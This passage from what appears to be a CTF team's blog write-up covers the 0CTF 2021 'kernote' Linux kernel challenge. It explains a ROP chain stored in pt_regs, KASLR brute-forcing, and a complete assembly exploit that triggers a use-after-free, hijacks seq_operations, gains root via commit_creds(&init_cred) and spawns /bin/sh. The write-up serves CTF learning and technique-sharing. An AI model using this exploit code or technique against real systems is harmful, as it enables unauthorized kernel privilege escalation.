+	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">eflags</span><span class="p">;</span>
+	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">rsp</span><span class="p">;</span>
+	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">ss</span><span class="p">;</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>At this point I had an idea: what if we could store a ROP chain in the contents
+of <code class="language-plaintext highlighter-rouge">pt_regs</code>? <code class="language-plaintext highlighter-rouge">r8</code>-<code class="language-plaintext highlighter-rouge">r15</code>, <code class="language-plaintext highlighter-rouge">rbx</code>, and <code class="language-plaintext highlighter-rouge">rbp</code> are ignored by the <code class="language-plaintext highlighter-rouge">read</code> syscall and
+can contain any value (except <code class="language-plaintext highlighter-rouge">r11</code> which contains the saved <code class="language-plaintext highlighter-rouge">rflags</code>). This
+gives us about 80 bytes of contiguous controlled memory. Is this enough to fit
+a ROP chain that gives us root and returns to userspace without crashing? Can
+we even move the stack pointer to the beginning of the controlled area in a
+single gadget?</p>
+
+<p>As luck would have it, the answer to the second question is yes! I found this
+gadget that moves the stack pointer by just the right amount when invoked from
+the overwritten <code class="language-plaintext highlighter-rouge">seq_operations</code> pointer:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0xffffffff81516ebe: add rsp, 0x180; mov eax, r12d; pop rbx; pop r12; pop rbp; ret; 
+</code></pre></div></div>
+
+<p>But still, 80 bytes is really not a lot. Can we fit our ROP chain in so little
+space? A typical payload used to get root in kernel exploits calls
+<code class="language-plaintext highlighter-rouge">commit_creds(prepare_kernel_cred(NULL))</code>. Doing this uses 32 bytes in our ROP
+chain. However in addition to this we have to return to userspace cleanly, or
+we will crash the VM before we can use our newly-acquired root credentials.
+Returning to userspace takes an additional 40 bytes because we need to set <code class="language-plaintext highlighter-rouge">rcx</code>
+to a valid userspace address and <code class="language-plaintext highlighter-rouge">r11</code> to valid flags before we can ROP to
+<code class="language-plaintext highlighter-rouge">syscall_return_via_sysret</code>. This comes in at 72 bytes, just below of our 80
+byte budget. We can further optimize this down to 64 bytes if we do
+<code class="language-plaintext highlighter-rouge">commit_creds(&amp;init_cred)</code> instead, and skip <code class="language-plaintext highlighter-rouge">prepare_kernel_cred</code>. <code class="language-plaintext highlighter-rouge">init_cred</code>
+is the <code class="language-plaintext highlighter-rouge">cred</code> structure used for the init process and it’s located in the
+kernel’s data section. Our final ROP chain then looks like this:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r15: 0xffffffff81075c4c: pop rdi; ret
+r14: 0xffffffff8266b780: &amp;init_cred
+r13: 0xffffffff810c9dd5: commit_creds
+r12: 0xffffffff810761da: pop rcx; ret
+rbp: &lt; address of our code in userspace &gt;
+rbx: 0xffffffff8107605a: pop r11; ret
+r11: &lt; valid rflags value &gt;
+r10: 0xffffffff81c00109: return from syscall
+</code></pre></div></div>
+
+<p>We need precise control over the values stored in the registers when we invoke
+the syscall handler. We need to recover our userspace stack after returning.
+This is probably possible in C but I figured I should write a helper function
+in assembly instead, to have more precise control over the registers. The
+<code class="language-plaintext highlighter-rouge">syscall</code> instruction already stores the current value of <code class="language-plaintext highlighter-rouge">rflags</code> in <code class="language-plaintext highlighter-rouge">r11</code> so
+we don’t have to set that register.</p>
+
+<pre><code class="language-x86asm">pwn:
+    mov [user_rsp], rsp
+    mov r15, 0xffffffff81075c4c
+    mov r14, 0xffffffff8266b780
+    mov r13, 0xffffffff810c9dd5
+    mov r12, 0xffffffff810761da
+    lea rbp, [.after_syscall]
+    mov rbx, 0xffffffff8107605a
+    mov r10, 0xffffffff81c00109
+    ; SYS_read
+    xor eax, eax
+    syscall
+.after_syscall:
+    mov rsp, [user_rsp]
+    ret
+
+user_rsp: dq 0
+</code></pre>
+
+<p>Combined with the <code class="language-plaintext highlighter-rouge">seq_operations</code> exploit this makes us root, and we can simply
+read and print the flag or <code class="language-plaintext highlighter-rouge">execve</code> a shell after returning to userspace.</p>
+
+<p>There is still an elephant in the room though. So far we have assumed that we
+know the address of all of these gadgets, and yet we still have absolutely no
+leaks of kernel addresses or a way to bypass KASLR.</p>
+
+<p>Luckily for us even with KASLR the base address of the kernel is not very random.
+In fact there are only 512 possible addresses at which the kernel will load
+itself. This is small enough that we can brute force it in a reasonable amount
+of time. We will keep trying our exploit assuming that the kernel’s base address
+is <code class="language-plaintext highlighter-rouge">0xffffffff81000000</code> (same as if there was no KASLR) and eventually we will
+succeed. We are nearly guaranteed to succeed at least once if we run the exploit
+~2000 times. In our experiments running the exploit against the remote system
+took about 5-10 seconds. We did some napkin math and concluded that we should
+be able to get the flag in about an hour or two by running multiple instances
+of the exploit in parallel. Since we still had several hours left before the
+end of the CTF we decided to go with that. We got the flag after about an hour.</p>
+
+<p>I ended up writing an optimized version of the exploit entirely in assembly to
+make it smaller and speed up the brute forcing. The target VM has no internet
+access so we have to upload the exploit through the VM’s serial port which takes
+a long time. Even when using UPX and musl, the C exploit was about 18KB. The
+exploit written in assembly is only 342 bytes when gzipped, so it uploads much
+faster.</p>
+
+<pre><code class="language-x86asm">; Keep running this exploit until it works, which should take about 512 tries.
+; Or alternatively find a KASLR bypass :)
+
+; Emit 64-bit code.
+bits 64
+; Use RIP-relative addressing by default.
+default rel
+; Load at this address
+org 0x40000000
+
+ELFCLASS64 equ 2
+ELFDATA2LSB equ 1
+EV_CURRENT equ 1
+ELFOSABI_NONE equ 0
+ET_EXEC equ 2
+EM_X86_64 equ 62
+PT_LOAD equ 1
+PF_X equ 1
+PF_W equ 2
+PF_R equ 4
+O_RDONLY equ 0
+O_RDWR equ 2
+
+; 64-bit ELF header.
+elfh: 
+; e_ident
+db 0x7f, 'ELF', ELFCLASS64, ELFDATA2LSB, EV_CURRENT, ELFOSABI_NONE, 0, 0, 0, 0, 0, 0, 0, 0
+; e_type
+dw ET_EXEC
+; e_machine
+dw EM_X86_64
+; e_version
+dd EV_CURRENT
+; e_entry
+dq _start
+; e_phoff
+dq phdr - $$
+; e_shoff
+dq 0
+; e_flags
+dd 0
+; e_ehsize
+dw ehsize
+; e_phentsize
+dw phsize
+; e_phnum
+dw 1
+; e_shentsize
+dw 0
+; e_shnum
+dw 0
+; e_shstrndx
+dw 0
+
+; Size of the elf header.
+ehsize equ $ - elfh
+
+; 64-bit program header.
+phdr:
+; p_type;
+dd PT_LOAD
+; p_flags;
+dd PF_R | PF_W | PF_X
+; p_offset;
+dq 0
+; p_vaddr;
+dq $$
+; p_paddr;
+dq $$
+; p_filesz;
+dq filesize
+; p_memsz;
+dq filesize
+; p_align;
+dq 0x1000
+
+phsize equ $ - phdr
+
+exit:
+    mov eax, 60
+    syscall
+    ud2
+
+open:
+    mov eax, 2
+    syscall
+    ret
+
+ioctl:
+    mov eax, 16
+    syscall
+    ret
+
+execve:
+    mov eax, 59
+    syscall
+    ud2
+
+set_note:
+    mov edx, edi
+    mov edi, [kfd]
+    mov esi, 0x6666
+    jmp ioctl
+
+alloc_entry:
+    mov edx, edi
+    mov edi, [kfd]
+    mov esi, 0x6667
+    jmp ioctl
+
+free_entry:
+    mov edx, edi
+    mov edi, [kfd]
+    mov esi, 0x6668
+    jmp ioctl
+
+write_note:
+    mov rdx, rdi
+    mov edi, [kfd]
+    mov esi, 0x6669
+    jmp ioctl
+
+pwn:
+    mov [user_rsp], rsp
+    ; 0xffffffff81075c4c: pop rdi; ret
+    mov r15, 0xffffffff81075c4c
+    ; 0xffffffff8266b780: init_cred
+    mov r14, 0xffffffff8266b780
+    ; 0xffffffff810c9dd5: commit_creds
+    mov r13, 0xffffffff810c9dd5
+    ; 0xffffffff810761da: pop rcx; ret
+    mov r12, 0xffffffff810761da
+    lea rbp, [.after_syscall]
+    ; 0xffffffff8107605a: pop r11; ret
+    mov rbx, 0xffffffff8107605a
+    ; 0xffffffff81c00109: return from syscall
+    mov r10, 0xffffffff81c00109
+    xor eax, eax
+    syscall
+.after_syscall:
+    mov rsp, [user_rsp]
+    ret
+
+_start:
+    ; kfd = open("/dev/kernote", O_RDWR)
+    lea rdi, [devpath]
+    mov esi, O_RDWR
+    call open
+    mov [kfd], eax
+
+    ; for (int i = 0; i &lt; 0x100; i++) {
+    ;   alloc_entry(0);
+    ; }
+    mov r8d, 0x100
+.sprayloop:
+    xor edi, edi
+    call alloc_entry
+    dec r8d
+    jnz .sprayloop
+
+    ; alloc_entry(1)
+    mov edi, 1
+    call alloc_entry
+    ; set_note(1)
+    mov edi, 1
+    call set_note
+    ; free_entry(1)
+    mov edi, 1
+    call free_entry
+
+    ; statfd = open("/proc/self/stat", O_RDONLY)
+    lea rdi, [statpath]
+    mov esi, O_RDONLY
+    call open
+    mov [statfd], eax
+
+    ; 0xffffffff81516ebe: add rsp, 0x180; mov eax, r12d; pop rbx; pop r12; pop rbp; ret; 
+    ; write_note(0xffffffff81516ebe)
+    mov rdi, 0xffffffff81516ebe
+    call write_note
+
+    ; pwn(statfd, buf, sizeof(buf))
+    mov edi, [statfd]
+    lea rsi, [buf]
+    mov edx, bufsize
+    call pwn
+
+    ; execve("/bin/sh", {"/bin/sh", NULL}, NULL)
+    lea rdi, [shell_path]
+    lea rsi, [shell_argv]
+    xor edx, edx
+    jmp execve
+
+user_rsp: dq 0
+kfd: dd 0
+statfd: dd 0
+shell_argv: dq shell_path, 0
+buf: times 32 db 0
+bufsize equ $ - buf
+
+devpath: db '/dev/kernote', 0
+statpath: db '/proc/self/stat', 0
+shell_path: db '/bin/sh', 0
+
+filesize equ $ - $$
+</code></pre>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>flag{LMm2tayzwWEzGpnmoyyf8zoTmk6X5TQrL45o}
+</code></pre></div></div>
+
+<h2 id="intended-solution">Intended solution</h2>
+
+<p>It is pretty clear that this solution is not what the author intended, but
+it was still fun and it got us a flag which is what counts. The intended
+solution was to overwrite a freed <code class="language-plaintext highlighter-rouge">ldt_struct</code>. You can find the author’s own
+writeup <a href="https://github.com/YZloser/My-CTF-Challenges/tree/master/0ctf-2021-final/kernote">here</a>.</p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>Thanks to busdma for the help with reversing and the initial PoC exploit and to
+my teammates for letting me bounce ideas off of them. Thanks to 0ops and eee for
+the amazing CTF, we really had a lot of fun playing this one. Looking forward
+to next year’s edition :).</p>
+
+<p>I don’t know if using <code class="language-plaintext highlighter-rouge">pt_regs</code> as ROP chain is a new technique or not. I’ve
+never heard of it before and I couldn’t find anything on Google. It seems pretty
+powerful though: it only requires RIP control and bypasses all mitigations
+except KASLR, assuming that the kernel has the right gadgets. Let me know if
+it’s been used before somewhere.</p>
+
+
+
+
+<!--       <footer class="site-footer">
+        <a href="https://twitter.com/0rganizers">Twitter</a> | <a id="changeTheme" class="btn-toggle">Dark-Mode</a>
+      </footer> -->
+
+      <div class="lever-meme">
+        <div id="lever" class="lever-off"></div>
+      </div>
+
+      <div class="twitter">
+        <a href="https://twitter.com/0rganizers"><img src="/assets/images/twitter.svg"></a>
+      </div>
+
+      <script>
+        let leverCount = 0;
+        let manic = false;
+
+        function resetLever() {
+            leverCount = 0;
+            setTimeout(resetLever, 1750);
+        }
+
+        resetLever();
+
+        document.getElementById('lever')
+        .addEventListener('click', function (event) {
+          if(leverCount > 10){
+            manic = true;
+            document.getElementById("lever").classList.add('lever-manic');
+            document.getElementById("header-logo").classList.add('rainbow');
+          }
+
+          if(!manic){
+            document.getElementById("lever").classList.toggle('lever-on');
+            ++leverCount;
+          }
+        });
+
+
+      </script>
+
+      <script>
+      function updateThemeToggleFooter() {
+        let elem = document.querySelector('#lever');
+        // elem.innerHTML = isLightThemeSelected() ? 'Dark Mode' : 'Light Mode'
+      }
+
+      (function() {
+        updateThemeToggleFooter()
+      })();
+
+      function togglePageContentLightDark() {
+          var html = document.getElementsByTagName('html')[0]
+          var currentClass = html.className
+          var newClass = html.className == 'dark-theme' ? 'light-theme' : 'dark-theme'
+          html.className = newClass
+
+          document.cookie = 'theme=' + (newClass == 'light-theme' ? 'light' : 'dark') + '; SameSite=Strict; path=/; expires=Fri, 31 Dec 9999 23:59:59 GMT'
+          console.log('Cookies are now: ' + document.cookie)
+
+          updateThemeToggleFooter()
+      }
+
+      const btn = document.querySelector("#lever");
+      btn.addEventListener("click", function() {
+        togglePageContentLightDark();
+      });
+      </script>
+    </main>
+  </body>
+</html>
